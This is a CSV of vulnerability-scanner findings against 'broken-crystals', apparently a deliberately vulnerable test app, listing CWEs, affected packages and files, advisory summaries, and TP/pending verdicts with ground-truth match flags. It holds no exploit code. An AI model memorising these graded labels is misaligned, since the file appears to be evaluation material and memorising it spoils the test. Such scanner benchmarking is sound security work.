finding_group_id,tools,target,cwe,severity,location,description,verdict,confidence,ground_truth_match,tool_count
GRP-broken-crystals-CWE-770-804,dep-check,broken-crystals,CWE-770,low,fastify:4.28.1,"### Impact A Denial of Service vulnerability in Fastify’s Web Streams response handling can allow a remote client to exhaust server memory. Applications that return a `ReadableStream` (or `Response` with a Web Stream body) via `reply.send()` are impacted. A slow or non-reading client can trigger unbounded buffering when backpressure is ignored, leading to process crashes or severe degradation. ### Patches The issue is fixed in Fastify 5.7.3. Users should upgrade to 5.7.3 or later. ### Workarounds Avoid sending Web Streams from Fastify responses (e.g., `ReadableStream` or `Response` bodies). Use Node.js streams (`stream.Readable`) or buffered payloads instead until the project can upgrade. ### References - https://hackerone.com/reports/3524779",pending,low,no,1
GRP-broken-crystals-CWE-770-805,dep-check,broken-crystals,CWE-770,info,undici:5.28.4,"### Impact The `fetch()` API supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., Content-Encoding: gzip, br). This is also supported by the undici decompress interceptor. However, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation. ### Patches Upgrade to 7.18.2 or 6.23.0. ### Workarounds It is possible to apply an undici interceptor and filter long `Content-Encoding` sequences manually. ### References * https://hackerone.com/reports/3456148 * https://github.com/advisories/GHSA-gm62-xv2j-4w53 * https://curl.se/docs/CVE-2022-32206.html",pending,low,no,1
GRP-broken-crystals-CWE-770-806,trivy,broken-crystals,CWE-770,high,libharfbuzz0b@2.3.1-1,harfbuzz: allows attackers to trigger O(n^2) growth via consecutive marks,pending,low,no,1
GRP-broken-crystals-CWE-770-807,trivy,broken-crystals,CWE-770,medium,libnghttp2-14@1.36.0-2+deb10u1,nghttp2: CONTINUATION frames DoS,pending,low,no,1
GRP-broken-crystals-CWE-770-808,trivy,broken-crystals,CWE-770,low,libopenjp2-7@2.3.0-2+deb10u2,openjpeg: DoS via memory exhaustion in opj_decompress,pending,low,no,1
GRP-broken-crystals-CWE-770-809,trivy,broken-crystals,CWE-770,low,libopenjp2-7-dev@2.3.0-2+deb10u2,openjpeg: DoS via memory exhaustion in opj_decompress,pending,low,no,1
GRP-broken-crystals-CWE-770-810,trivy,broken-crystals,CWE-770,medium,libssl-dev@1.1.1n-0+deb10u4,openssl: Possible DoS translating ASN.1 object identifiers,pending,low,no,1
GRP-broken-crystals-CWE-770-811,trivy,broken-crystals,CWE-770,medium,libssl1.1@1.1.1n-0+deb10u4,openssl: Possible DoS translating ASN.1 object identifiers,pending,low,no,1
GRP-broken-crystals-CWE-770-812,trivy,broken-crystals,CWE-770,high,libsystemd0@241-7~deb10u9,bind9: KeyTrap - Extreme CPU consumption in DNSSEC validator,pending,low,no,1
GRP-broken-crystals-CWE-770-813,trivy,broken-crystals,CWE-770,high,libudev1@241-7~deb10u9,bind9: KeyTrap - Extreme CPU consumption in DNSSEC validator,pending,low,no,1
GRP-broken-crystals-CWE-770-814,trivy,broken-crystals,CWE-770,high,libunbound8@1.9.0-2+deb10u3,bind9: KeyTrap - Extreme CPU consumption in DNSSEC validator,pending,low,no,1
GRP-broken-crystals-CWE-770-815,trivy,broken-crystals,CWE-770,medium,linux-libc-dev@4.19.269-1,kernel: memcg does not limit the number of POSIX file locks allowing memory exhaustion,pending,low,no,1
GRP-broken-crystals-CWE-770-816,trivy,broken-crystals,CWE-770,medium,openssl@1.1.1n-0+deb10u4,openssl: Possible DoS translating ASN.1 object identifiers,pending,low,no,1
GRP-broken-crystals-CWE-770-817,trivy,broken-crystals,CWE-770,high,@fastify/multipart@7.4.1,Unlimited consumption of resources in @fastify/multipart,pending,low,no,1
GRP-broken-crystals-CWE-770-818,trivy,broken-crystals,CWE-770,low,fastify@4.13.0,Fastify: Fastify: Denial of Service via unbounded buffering in Web Streams response handling,pending,low,no,1
GRP-broken-crystals-CWE-770-819,trivy,broken-crystals,CWE-770,medium,undici@5.21.0,undici: Undici: Denial of Service via excessive decompression steps,pending,low,no,1
GRP-broken-crystals-CWE-772-820,trivy,broken-crystals,CWE-772,high,curl@7.64.0-4+deb10u5,curl: HTTP/2 push headers memory-leak,pending,low,no,1
GRP-broken-crystals-CWE-772-821,trivy,broken-crystals,CWE-772,high,libcurl3-gnutls@7.64.0-4+deb10u5,curl: HTTP/2 push headers memory-leak,pending,low,no,1
GRP-broken-crystals-CWE-772-822,trivy,broken-crystals,CWE-772,high,libcurl4@7.64.0-4+deb10u5,curl: HTTP/2 push headers memory-leak,pending,low,no,1
GRP-broken-crystals-CWE-772-823,trivy,broken-crystals,CWE-772,high,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: HTTP/2 push headers memory-leak,pending,low,no,1
GRP-broken-crystals-CWE-772-824,trivy,broken-crystals,CWE-772,medium,linux-libc-dev@4.19.269-1,kernel: task processes not being properly ended could lead to resource exhaustion,pending,low,no,1
GRP-broken-crystals-CWE-78-825,npm-audit,broken-crystals,CWE-78,high,glob,glob CLI: Command injection via -c/--cmd executes matches with shell:true,TP,medium,yes,1
GRP-broken-crystals-CWE-78-826,trivy,broken-crystals,CWE-78,medium,openssh-client@1:7.9p1-10+deb10u2,openssh: potential command injection via shell metacharacters,TP,medium,yes,1
GRP-broken-crystals-CWE-787-827,trivy,broken-crystals,CWE-787,high,gir1.2-gdkpixbuf-2.0@2.38.1+dfsg-1,gnome: heap memory corruption on gdk-pixbuf,pending,low,no,1
GRP-broken-crystals-CWE-787-828,trivy,broken-crystals,CWE-787,high,libc-bin@2.28-10+deb10u2,glibc: array overflow in backtrace functions for powerpc,pending,low,no,1
GRP-broken-crystals-CWE-787-829,trivy,broken-crystals,CWE-787,high,libc-dev-bin@2.28-10+deb10u2,glibc: array overflow in backtrace functions for powerpc,pending,low,no,1
GRP-broken-crystals-CWE-787-830,trivy,broken-crystals,CWE-787,high,libc6@2.28-10+deb10u2,glibc: array overflow in backtrace functions for powerpc,pending,low,no,1
GRP-broken-crystals-CWE-787-831,trivy,broken-crystals,CWE-787,high,libc6-dev@2.28-10+deb10u2,glibc: array overflow in backtrace functions for powerpc,pending,low,no,1
GRP-broken-crystals-CWE-787-832,trivy,broken-crystals,CWE-787,high,libde265-0@1.0.11-0+deb10u4,Libde265 v1.0.11 was discovered to contain a heap buffer overflow via ...,pending,low,no,1
GRP-broken-crystals-CWE-787-833,trivy,broken-crystals,CWE-787,medium,libelf1@0.176-1.1,The libcpu component which is used by libasm of elfutils version 0.177 ...,pending,low,no,1
GRP-broken-crystals-CWE-787-834,trivy,broken-crystals,CWE-787,high,libgdk-pixbuf2.0-0@2.38.1+dfsg-1,gnome: heap memory corruption on gdk-pixbuf,pending,low,no,1
GRP-broken-crystals-CWE-787-835,trivy,broken-crystals,CWE-787,high,libgdk-pixbuf2.0-bin@2.38.1+dfsg-1,gnome: heap memory corruption on gdk-pixbuf,pending,low,no,1
GRP-broken-crystals-CWE-787-836,trivy,broken-crystals,CWE-787,high,libgdk-pixbuf2.0-common@2.38.1+dfsg-1,gnome: heap memory corruption on gdk-pixbuf,pending,low,no,1
GRP-broken-crystals-CWE-787-837,trivy,broken-crystals,CWE-787,high,libgdk-pixbuf2.0-dev@2.38.1+dfsg-1,gnome: heap memory corruption on gdk-pixbuf,pending,low,no,1
GRP-broken-crystals-CWE-787-838,trivy,broken-crystals,CWE-787,medium,libjpeg-dev@1:1.5.2-2+deb10u1,libjpeg-turbo: heap buffer overflow in get_word_rgb_row() in rdppm.c,pending,low,no,1
GRP-broken-crystals-CWE-787-839,trivy,broken-crystals,CWE-787,medium,libjpeg62-turbo@1:1.5.2-2+deb10u1,libjpeg-turbo: heap buffer overflow in get_word_rgb_row() in rdppm.c,pending,low,no,1
GRP-broken-crystals-CWE-787-840,trivy,broken-crystals,CWE-787,medium,libjpeg62-turbo-dev@1:1.5.2-2+deb10u1,libjpeg-turbo: heap buffer overflow in get_word_rgb_row() in rdppm.c,pending,low,no,1
GRP-broken-crystals-CWE-787-841,trivy,broken-crystals,CWE-787,low,liblz4-1@1.8.3-1+deb10u1,lz4: heap-based buffer overflow in LZ4_write32,pending,low,no,1
GRP-broken-crystals-CWE-787-842,trivy,broken-crystals,CWE-787,high,libncurses-dev@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-843,trivy,broken-crystals,CWE-787,high,libncurses5-dev@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-844,trivy,broken-crystals,CWE-787,high,libncurses6@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-845,trivy,broken-crystals,CWE-787,high,libncursesw5-dev@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-846,trivy,broken-crystals,CWE-787,high,libncursesw6@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-847,trivy,broken-crystals,CWE-787,high,libopenjp2-7@2.3.0-2+deb10u2,openjpeg: heap-buffer-overflow in color.c may lead to DoS or arbitrary code execution,pending,low,no,1
GRP-broken-crystals-CWE-787-848,trivy,broken-crystals,CWE-787,high,libopenjp2-7-dev@2.3.0-2+deb10u2,openjpeg: heap-buffer-overflow in color.c may lead to DoS or arbitrary code execution,pending,low,no,1
GRP-broken-crystals-CWE-787-849,trivy,broken-crystals,CWE-787,high,libssh2-1@1.8.0-2.1,libssh2: use-of-uninitialized-value in _libssh2_transport_read,pending,low,no,1
GRP-broken-crystals-CWE-787-850,trivy,broken-crystals,CWE-787,high,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: TIFFRasterScanlineSize64 produce too-big size and could cause OOM,pending,low,no,1
GRP-broken-crystals-CWE-787-851,trivy,broken-crystals,CWE-787,high,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: TIFFRasterScanlineSize64 produce too-big size and could cause OOM,pending,low,no,1
GRP-broken-crystals-CWE-787-852,trivy,broken-crystals,CWE-787,high,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: TIFFRasterScanlineSize64 produce too-big size and could cause OOM,pending,low,no,1
GRP-broken-crystals-CWE-787-853,trivy,broken-crystals,CWE-787,high,libtinfo6@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-854,trivy,broken-crystals,CWE-787,high,libwebp-dev@0.6.1-2+deb10u1,libwebp: Heap buffer overflow in WebP Codec,pending,low,no,1
GRP-broken-crystals-CWE-787-855,trivy,broken-crystals,CWE-787,high,libwebp6@0.6.1-2+deb10u1,libwebp: Heap buffer overflow in WebP Codec,pending,low,no,1
GRP-broken-crystals-CWE-787-856,trivy,broken-crystals,CWE-787,high,libwebpdemux2@0.6.1-2+deb10u1,libwebp: Heap buffer overflow in WebP Codec,pending,low,no,1
GRP-broken-crystals-CWE-787-857,trivy,broken-crystals,CWE-787,high,libwebpmux3@0.6.1-2+deb10u1,libwebp: Heap buffer overflow in WebP Codec,pending,low,no,1
GRP-broken-crystals-CWE-787-858,trivy,broken-crystals,CWE-787,medium,libx11-6@2:1.6.7-1+deb10u2,libX11: out-of-bounds memory access in _XkbReadKeySyms(),pending,low,no,1
GRP-broken-crystals-CWE-787-859,trivy,broken-crystals,CWE-787,medium,libx11-data@2:1.6.7-1+deb10u2,libX11: out-of-bounds memory access in _XkbReadKeySyms(),pending,low,no,1
GRP-broken-crystals-CWE-787-860,trivy,broken-crystals,CWE-787,medium,libx11-dev@2:1.6.7-1+deb10u2,libX11: out-of-bounds memory access in _XkbReadKeySyms(),pending,low,no,1
GRP-broken-crystals-CWE-787-861,trivy,broken-crystals,CWE-787,high,linux-libc-dev@4.19.269-1,kernel: out-of-bounds write in __remove_dirty_segment in fs/f2fs/segment.c,pending,low,no,1
GRP-broken-crystals-CWE-787-862,trivy,broken-crystals,CWE-787,high,ncurses-base@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-787-863,trivy,broken-crystals,CWE-787,high,ncurses-bin@6.1+20181013-2+deb10u3,ncurses: heap-based buffer overflow in _nc_captoinfo() in captoinfo.c,pending,low,no,1
GRP-broken-crystals-CWE-79-864,dep-check,broken-crystals,CWE-79,high,@remix-run/router:1.19.2,"React Router (and Remix v1/v2) SPA open navigation redirects originating from loaders or actions in [Framework Mode](https://reactrouter.com/start/modes#framework), [Data Mode](https://reactrouter.com/start/modes#data), or the unstable RSC modes can result in unsafe URLs causing unintended javascript execution on the client. This is only an issue if developers are creating redirect paths from untrusted content or via an open redirect. > [!NOTE] > This does not impact applications that use [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`).",TP,medium,yes,1
GRP-broken-crystals-CWE-79-865,dep-check,broken-crystals,CWE-79,medium,bootstrap.min.js,"In Bootstrap before 4.1.2, XSS is possible in the collapse data-parent attribute.",TP,medium,yes,1
GRP-broken-crystals-CWE-79-866,dep-check,broken-crystals,CWE-79,medium,jquery.min.js,"In jQuery versions greater than or equal to 1.2 and before 3.5.0, passing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code. This problem is patched in jQuery 3.5.0.",TP,medium,yes,1
GRP-broken-crystals-CWE-79-867,trivy,broken-crystals,CWE-79,medium,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: Incorrect server side include parsing can lead to XSS,TP,medium,yes,1
GRP-broken-crystals-CWE-79-868,trivy,broken-crystals,CWE-79,medium,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: Incorrect server side include parsing can lead to XSS,TP,medium,yes,1
GRP-broken-crystals-CWE-79-869,trivy,broken-crystals,CWE-79,low,send@0.17.2,send: Code Execution Vulnerability in Send Library,TP,medium,yes,1
GRP-broken-crystals-CWE-79-870,bearer,broken-crystals,CWE-79,info,client/src/pages/main/Contact.tsx:8,"## Description Unsanitized user input in dynamic HTML insertion can lead to Cross-Site Scripting (XSS) attacks. This vulnerability arises when user-provided data is directly inserted into the DOM without proper sanitization, potentially allowing attackers to execute malicious scripts. ## Remediations - **Do** use an HTML sanitization library to clean user input before inserting it into the HTML. This step helps prevent XSS attacks by removing or neutralizing any potentially harmful scripts. ```javascript import sanitizeHtml from 'sanitize-html'; const html = `<strong>${user.Input}</strong>`; document.body.innerHTML = sanitizeHtml(html); ``` ## References - [OWASP XSS explained](https://owasp.org/www-community/attacks/xss/)",TP,medium,yes,1
GRP-broken-crystals-CWE-79-871,bearer,broken-crystals,CWE-79,info,client/src/pages/marketplace/Marketplace.tsx:126,"## Description Unsanitized user input in dynamic HTML insertion can lead to Cross-Site Scripting (XSS) attacks. This vulnerability arises when user-provided data is directly inserted into the DOM without proper sanitization, potentially allowing attackers to execute malicious scripts. ## Remediations - **Do** use an HTML sanitization library to clean user input before inserting it into the HTML. This step helps prevent XSS attacks by removing or neutralizing any potentially harmful scripts. ```javascript import sanitizeHtml from 'sanitize-html'; const html = `<strong>${user.Input}</strong>`; document.body.innerHTML = sanitizeHtml(html); ``` ## References - [OWASP XSS explained](https://owasp.org/www-community/attacks/xss/)",TP,medium,yes,1
GRP-broken-crystals-CWE-79-872,bearer,broken-crystals,CWE-79,info,client/src/pages/chat/ChatWidget.tsx:7,"## Description Using React's dangerouslySetInnerHTML with unsanitized data can introduce Cross-Site Scripting (XSS) vulnerabilities. This occurs when external input is embedded directly into the HTML without proper sanitization, allowing attackers to inject malicious scripts. ## Remediations - **Do** sanitize data before using it with dangerouslySetInnerHTML. This step is crucial to prevent XSS attacks by ensuring that the input does not contain harmful scripts. ```javascript <div dangerouslySetInnerHTML={{__html: sanitize(data)}} /> ``` ## References - [OWASP Cross-Site Scripting (XSS) Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)",TP,medium,yes,1
GRP-broken-crystals-CWE-79-873,bearer,broken-crystals,CWE-79,info,client/src/pages/hidden/HiddenUpload.tsx:132,"## Description Using React's dangerouslySetInnerHTML with unsanitized data can introduce Cross-Site Scripting (XSS) vulnerabilities. This occurs when external input is embedded directly into the HTML without proper sanitization, allowing attackers to inject malicious scripts. ## Remediations - **Do** sanitize data before using it with dangerouslySetInnerHTML. This step is crucial to prevent XSS attacks by ensuring that the input does not contain harmful scripts. ```javascript <div dangerouslySetInnerHTML={{__html: sanitize(data)}} /> ``` ## References - [OWASP Cross-Site Scripting (XSS) Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)",TP,medium,yes,1
GRP-broken-crystals-CWE-798-874,bearer,broken-crystals,CWE-798,info,client/src/pages/marketplace/Partners/Partners.tsx:14,"## Description Storing secrets directly in your code is a security risk. Instead, opt for environment variables or a secret management system to safeguard your secrets. ## Remediations - **Do not** store plaintext secrets in your code. This exposes sensitive information to unnecessary risk. ```javascript passport.use(new OAuth2Strategy({ authorizationURL: 'https://www.example.com/oauth2/authorize', tokenURL: 'https://www.example.com/oauth2/token', clientID: 'my-id-123', clientSecret: 'shh-my-secret', callbackURL: 'http://localhost:3000/auth/example/callback' }, function(accessToken, refreshToken, profile, cb) { User.findOrCreate({ exampleId: profile.id }, function (err, user) { return cb(err, user); }); } )); ``` - **Do** use environment variables to store sensitive information such as secrets. This method keeps credentials out of your codebase and makes them easier to manage securely. - **Do** consider implementing a key-management system to securely handle secrets and other sensitive information. This approach provides enhanced security measures for managing and accessing credentials. ## References - [OWASP hardcoded passwords](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password) - [Google Cloud Key Management Service](https://cloud.google.com/kms/docs) - [AWS Key Management Service](https://aws.amazon.com/kms/)",pending,low,no,1
GRP-broken-crystals-CWE-798-875,bearer,broken-crystals,CWE-798,info,src/auth/auth.controller.ts:166,"## Description Storing secrets directly in your code is a security risk. Instead, opt for environment variables or a secret management system to safeguard your secrets. ## Remediations - **Do not** store plaintext secrets in your code. This exposes sensitive information to unnecessary risk. ```javascript passport.use(new OAuth2Strategy({ authorizationURL: 'https://www.example.com/oauth2/authorize', tokenURL: 'https://www.example.com/oauth2/token', clientID: 'my-id-123', clientSecret: 'shh-my-secret', callbackURL: 'http://localhost:3000/auth/example/callback' }, function(accessToken, refreshToken, profile, cb) { User.findOrCreate({ exampleId: profile.id }, function (err, user) { return cb(err, user); }); } )); ``` - **Do** use environment variables to store sensitive information such as secrets. This method keeps credentials out of your codebase and makes them easier to manage securely. - **Do** consider implementing a key-management system to securely handle secrets and other sensitive information. This approach provides enhanced security measures for managing and accessing credentials. ## References - [OWASP hardcoded passwords](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password) - [Google Cloud Key Management Service](https://cloud.google.com/kms/docs) - [AWS Key Management Service](https://aws.amazon.com/kms/)",pending,low,no,1
GRP-broken-crystals-CWE-824-876,trivy,broken-crystals,CWE-824,medium,krb5-multidev@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-877,trivy,broken-crystals,CWE-824,medium,libgssapi-krb5-2@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-878,trivy,broken-crystals,CWE-824,medium,libgssrpc4@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-879,trivy,broken-crystals,CWE-824,medium,libk5crypto3@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-880,trivy,broken-crystals,CWE-824,medium,libkadm5clnt-mit11@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-881,trivy,broken-crystals,CWE-824,medium,libkadm5srv-mit11@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-882,trivy,broken-crystals,CWE-824,medium,libkdb5-9@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-883,trivy,broken-crystals,CWE-824,medium,libkrb5-3@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-884,trivy,broken-crystals,CWE-824,medium,libkrb5-dev@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-824-885,trivy,broken-crystals,CWE-824,medium,libkrb5support0@1.17-3+deb10u5,krb5: Denial of service through freeing uninitialized pointer,pending,low,no,1
GRP-broken-crystals-CWE-833-886,trivy,broken-crystals,CWE-833,medium,linux-libc-dev@4.19.269-1,kernel: blocking operation in dvb_frontend_get_event and wait_event_interruptible,pending,low,no,1
GRP-broken-crystals-CWE-834-887,trivy,broken-crystals,CWE-834,medium,libopenjp2-7@2.3.0-2+deb10u2,openjpeg: denial of service in function opj_t1_encode_cblks in openjp2/t1.c,pending,low,no,1
GRP-broken-crystals-CWE-834-888,trivy,broken-crystals,CWE-834,medium,libopenjp2-7-dev@2.3.0-2+deb10u2,openjpeg: denial of service in function opj_t1_encode_cblks in openjp2/t1.c,pending,low,no,1
GRP-broken-crystals-CWE-835-889,npm-audit,broken-crystals,CWE-835,info,bn.js,bn.js affected by an infinite loop,pending,low,no,1
GRP-broken-crystals-CWE-835-890,dep-check,broken-crystals,CWE-835,info,bn.js:4.12.0,"This affects versions of the package bn.js before 4.12.3 and 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely.",pending,low,no,1
GRP-broken-crystals-CWE-835-891,dep-check,broken-crystals,CWE-835,info,nanoid:3.3.7,"When nanoid is called with a fractional value, there were a number of undesirable effects: 1. in browser and non-secure, the code infinite loops on while (size--) 2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled 3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error Version 3.3.8 and 5.0.9 are fixed.",pending,low,no,1
GRP-broken-crystals-CWE-835-892,trivy,broken-crystals,CWE-835,low,libcairo-gobject2@1.16.0-4+deb10u1,cairo: infinite loop in the function _arc_error_normalized in the file cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-835-893,trivy,broken-crystals,CWE-835,low,libcairo-script-interpreter2@1.16.0-4+deb10u1,cairo: infinite loop in the function _arc_error_normalized in the file cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-835-894,trivy,broken-crystals,CWE-835,low,libcairo2@1.16.0-4+deb10u1,cairo: infinite loop in the function _arc_error_normalized in the file cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-835-895,trivy,broken-crystals,CWE-835,low,libcairo2-dev@1.16.0-4+deb10u1,cairo: infinite loop in the function _arc_error_normalized in the file cairo-arc.c,pending,low,no,1
GRP-broken-crystals-CWE-835-896,trivy,broken-crystals,CWE-835,low,libcroco3@0.6.12-3,libcroco: Infinite loop in the cr_parser_parse_selector_core function,pending,low,no,1
GRP-broken-crystals-CWE-835-897,trivy,broken-crystals,CWE-835,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: infinite loop in the tarfile module via crafted TAR archive,pending,low,no,1
GRP-broken-crystals-CWE-835-898,trivy,broken-crystals,CWE-835,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: infinite loop in the tarfile module via crafted TAR archive,pending,low,no,1
GRP-broken-crystals-CWE-835-899,trivy,broken-crystals,CWE-835,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: urllib: HTTP client possible infinite loop on a 100 Continue response,pending,low,no,1
GRP-broken-crystals-CWE-835-900,trivy,broken-crystals,CWE-835,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: urllib: HTTP client possible infinite loop on a 100 Continue response,pending,low,no,1
GRP-broken-crystals-CWE-835-901,trivy,broken-crystals,CWE-835,medium,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: infinite loop via a crafted TIFF file,pending,low,no,1
GRP-broken-crystals-CWE-835-902,trivy,broken-crystals,CWE-835,medium,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: infinite loop via a crafted TIFF file,pending,low,no,1
GRP-broken-crystals-CWE-835-903,trivy,broken-crystals,CWE-835,medium,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: infinite loop via a crafted TIFF file,pending,low,no,1
GRP-broken-crystals-CWE-835-904,trivy,broken-crystals,CWE-835,high,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: Infinite recursion in parameter entities,pending,low,no,1
GRP-broken-crystals-CWE-835-905,trivy,broken-crystals,CWE-835,high,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: Infinite recursion in parameter entities,pending,low,no,1
GRP-broken-crystals-CWE-835-906,trivy,broken-crystals,CWE-835,medium,linux-libc-dev@4.19.269-1,kernel: batman-adv: Avoid infinite loop trying to resize local TT,pending,low,no,1
GRP-broken-crystals-CWE-835-907,trivy,broken-crystals,CWE-835,high,python2.7@2.7.16-2+deb10u1,python: infinite loop in the tarfile module via crafted TAR archive,pending,low,no,1
GRP-broken-crystals-CWE-835-908,trivy,broken-crystals,CWE-835,high,python2.7-minimal@2.7.16-2+deb10u1,python: infinite loop in the tarfile module via crafted TAR archive,pending,low,no,1
GRP-broken-crystals-CWE-835-909,trivy,broken-crystals,CWE-835,high,python3.7@3.7.3-2+deb10u4,python: urllib: HTTP client possible infinite loop on a 100 Continue response,pending,low,no,1
GRP-broken-crystals-CWE-835-910,trivy,broken-crystals,CWE-835,high,python3.7-minimal@3.7.3-2+deb10u4,python: urllib: HTTP client possible infinite loop on a 100 Continue response,pending,low,no,1
GRP-broken-crystals-CWE-835-911,trivy,broken-crystals,CWE-835,medium,bn.js@4.12.0,bn.js: bn.js: Denial of Service via calling maskn(0),pending,low,no,1
GRP-broken-crystals-CWE-843-912,npm-audit,broken-crystals,CWE-843,critical,libxmljs,libxmljs vulnerable to type confusion when parsing specially crafted XML,pending,low,no,1
GRP-broken-crystals-CWE-843-913,dep-check,broken-crystals,CWE-843,critical,libxmljs:1.0.11,"libxmljs is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking a function on the result of `attrs()` that was called on a parsed node. This vulnerability might lead to denial of service (on both 32-bit systems and 64-bit systems), data leak, infinite loop and remote code execution (on 32-bit systems with the XML_PARSE_HUGE flag enabled).",pending,low,no,1
GRP-broken-crystals-CWE-843-914,trivy,broken-crystals,CWE-843,high,linux-libc-dev@4.19.269-1,kernel: Type confusion in pick_next_rt_entity(),pending,low,no,1
GRP-broken-crystals-CWE-843-915,trivy,broken-crystals,CWE-843,critical,libxmljs@0.19.7,libxmljs vulnerable to type confusion when parsing specially crafted XML,pending,low,no,1
GRP-broken-crystals-CWE-89-916,trivy,broken-crystals,CWE-89,high,libpq-dev@11.19-0+deb10u1,postgresql: extension script @substitutions@ within quoting allow SQL injection,TP,medium,yes,1
GRP-broken-crystals-CWE-89-917,trivy,broken-crystals,CWE-89,high,libpq5@11.19-0+deb10u1,postgresql: extension script @substitutions@ within quoting allow SQL injection,TP,medium,yes,1
GRP-broken-crystals-CWE-89-918,trivy,broken-crystals,CWE-89,high,knex@0.21.19,Knex.js has a limited SQL injection vulnerability,TP,medium,yes,1
